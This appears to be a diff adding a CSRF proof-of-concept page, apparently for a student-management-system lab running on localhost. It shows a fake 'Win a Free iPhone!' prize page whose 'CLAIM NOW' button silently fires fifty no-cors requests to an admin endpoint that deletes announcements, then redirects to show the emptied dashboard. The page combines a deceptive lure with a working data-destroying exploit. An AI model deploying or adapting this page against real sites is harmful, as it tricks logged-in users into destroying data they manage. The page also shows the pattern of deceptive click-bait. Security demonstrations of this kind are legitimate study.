@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Win a Free iPhone!</title>
+</head>
+
+<body style="font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding-top: 50px;">
+    <h1>CONGRATULATIONS!</h1>
+    <p>You have been selected to win a free **GIFT**!</p>
+    <div
+        style="margin: 20px; padding: 20px; background: white; border: 2px solid gold; border-radius: 10px; display: inline-block;">
+        <p>Click the button below to claim your prize instantly!</p>
+        <button onclick="triggerAttack()"
+            style="background-color: #ffd700; color: black; border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 5px;">CLAIM
+            NOW</button>
+    </div>
+
+    <script>
+        function triggerAttack() {
+            // Change button text so you know it's working
+            document.querySelector("button").innerText = "Processing...";
+            
+            // The "Nuke" CSRF Attack:
+            // Send 50 delete requests using fetch (more reliable than Image in modern browsers)
+            for (let i = 1; i <= 50; i++) {
+                
+                // IMPORTANT: Change this URL if your project has a different folder name!
+                let attackUrl = "http://localhost:8080/admin?action=delete_announcement&id=" + i;
+                // let attackUrl = "http://localhost:8080/student-management-system/admin?action=delete_announcement&id=" + i;
+                
+                fetch(attackUrl, { mode: 'no-cors' }).catch(e => console.log(e));
+            }
+
+            // Redirect the browser after 1.5 seconds to see the empty dashboard
+            setTimeout(function() {
+                let redirectUrl = "http://localhost:8080/admin_announcements.jsp";
+                // let redirectUrl = "http://localhost:8080/student-management-system/admin_announcements.jsp";
+                
+                window.location.href = redirectUrl;
+            }, 1500);
+        }
+    </script>
+</body>
+
+</html>
